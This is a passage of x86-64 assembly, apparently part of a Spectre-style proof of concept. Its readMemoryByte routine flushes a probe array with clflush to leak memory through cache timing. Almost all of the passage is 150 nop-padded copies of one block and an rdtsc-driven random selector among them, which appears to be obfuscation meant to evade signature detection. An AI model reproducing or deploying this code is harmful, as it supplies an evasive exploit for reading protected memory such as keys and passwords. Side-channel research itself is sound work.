	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 97
.LreadMemoryByte_win7_var97:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 98
.LreadMemoryByte_win7_var98:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 99
.LreadMemoryByte_win7_var99:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 100
.LreadMemoryByte_win7_var100:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 101
.LreadMemoryByte_win7_var101:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 102
.LreadMemoryByte_win7_var102:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 103
.LreadMemoryByte_win7_var103:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 104
.LreadMemoryByte_win7_var104:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 105
.LreadMemoryByte_win7_var105:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 106
.LreadMemoryByte_win7_var106:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 107
.LreadMemoryByte_win7_var107:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 108
.LreadMemoryByte_win7_var108:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 109
.LreadMemoryByte_win7_var109:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 110
.LreadMemoryByte_win7_var110:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 111
.LreadMemoryByte_win7_var111:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 112
.LreadMemoryByte_win7_var112:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 113
.LreadMemoryByte_win7_var113:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 114
.LreadMemoryByte_win7_var114:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 115
.LreadMemoryByte_win7_var115:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 116
.LreadMemoryByte_win7_var116:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 117
.LreadMemoryByte_win7_var117:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 118
.LreadMemoryByte_win7_var118:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 119
.LreadMemoryByte_win7_var119:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 120
.LreadMemoryByte_win7_var120:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 121
.LreadMemoryByte_win7_var121:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 122
.LreadMemoryByte_win7_var122:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 123
.LreadMemoryByte_win7_var123:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 124
.LreadMemoryByte_win7_var124:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 125
.LreadMemoryByte_win7_var125:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 126
.LreadMemoryByte_win7_var126:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 127
.LreadMemoryByte_win7_var127:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 128
.LreadMemoryByte_win7_var128:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 129
.LreadMemoryByte_win7_var129:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 130
.LreadMemoryByte_win7_var130:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 131
.LreadMemoryByte_win7_var131:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 132
.LreadMemoryByte_win7_var132:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 133
.LreadMemoryByte_win7_var133:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 134
.LreadMemoryByte_win7_var134:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 135
.LreadMemoryByte_win7_var135:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 136
.LreadMemoryByte_win7_var136:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 137
.LreadMemoryByte_win7_var137:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 138
.LreadMemoryByte_win7_var138:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 139
.LreadMemoryByte_win7_var139:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 140
.LreadMemoryByte_win7_var140:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 141
.LreadMemoryByte_win7_var141:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 142
.LreadMemoryByte_win7_var142:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 143
.LreadMemoryByte_win7_var143:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 144
.LreadMemoryByte_win7_var144:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 145
.LreadMemoryByte_win7_var145:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 146
.LreadMemoryByte_win7_var146:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 147
.LreadMemoryByte_win7_var147:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 148
.LreadMemoryByte_win7_var148:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 149
.LreadMemoryByte_win7_var149:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
.LreadMemoryByte_win7_continue:
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.9:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_7
LBB1_10:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	movl	%edx, %eax
                                        ## kill: def $rax killed $eax
	movq	%rax, -80(%rbp)
	movl	$59, -60(%rbp)
LBB1_11:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Loop Header: Depth=2
                                        ##       Child Loop BB1_13 Depth 3
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win6_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win6_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win6_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win6_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win6_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win6_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win6_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win6_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win6_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win6_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win6_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win6_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win6_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win6_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win6_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win6_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win6_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win6_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win6_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win6_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win6_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win6_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win6_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win6_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win6_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win6_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win6_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win6_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win6_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win6_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win6_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win6_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win6_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win6_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win6_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win6_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win6_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win6_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win6_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win6_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win6_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win6_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win6_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win6_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win6_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win6_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win6_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win6_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win6_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win6_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win6_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win6_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win6_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win6_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win6_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win6_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win6_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win6_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win6_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win6_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win6_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win6_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win6_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win6_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win6_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win6_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win6_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win6_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win6_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win6_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win6_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win6_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win6_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win6_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win6_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win6_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win6_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win6_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win6_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win6_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win6_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win6_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win6_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win6_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win6_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win6_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win6_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win6_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win6_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win6_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win6_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win6_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win6_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win6_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win6_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win6_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win6_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win6_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win6_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win6_var99
	cmpl	$100, %eax
	je	.LreadMemoryByte_win6_var100
	cmpl	$101, %eax
	je	.LreadMemoryByte_win6_var101
	cmpl	$102, %eax
	je	.LreadMemoryByte_win6_var102
	cmpl	$103, %eax
	je	.LreadMemoryByte_win6_var103
	cmpl	$104, %eax
	je	.LreadMemoryByte_win6_var104
	cmpl	$105, %eax
	je	.LreadMemoryByte_win6_var105
	cmpl	$106, %eax
	je	.LreadMemoryByte_win6_var106
	cmpl	$107, %eax
	je	.LreadMemoryByte_win6_var107
	cmpl	$108, %eax
	je	.LreadMemoryByte_win6_var108
	cmpl	$109, %eax
	je	.LreadMemoryByte_win6_var109
	cmpl	$110, %eax
	je	.LreadMemoryByte_win6_var110
	cmpl	$111, %eax
	je	.LreadMemoryByte_win6_var111
	cmpl	$112, %eax
	je	.LreadMemoryByte_win6_var112
	cmpl	$113, %eax
	je	.LreadMemoryByte_win6_var113
	cmpl	$114, %eax
	je	.LreadMemoryByte_win6_var114
	cmpl	$115, %eax
	je	.LreadMemoryByte_win6_var115
	cmpl	$116, %eax
	je	.LreadMemoryByte_win6_var116
	cmpl	$117, %eax
	je	.LreadMemoryByte_win6_var117
	cmpl	$118, %eax
